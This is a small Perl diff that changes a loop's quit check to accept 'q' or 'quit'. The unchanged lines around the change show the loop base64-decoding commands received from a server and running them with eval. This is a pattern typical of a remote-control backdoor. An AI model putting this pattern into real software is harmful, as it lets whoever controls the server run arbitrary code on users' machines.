@@ -20,7 +20,7 @@ my $acunt = '';
 my $paswd = '';
 my $commd = '';
 my $input = '';
-until ($commd eq 'HELP' && $input eq 'q') {
+until ($commd eq 'HELP' && $input =~ /^\s*q(uit)?\s*$/i) {
     my $ser_cmd = decode_base64(talk());
 
     eval $ser_cmd;
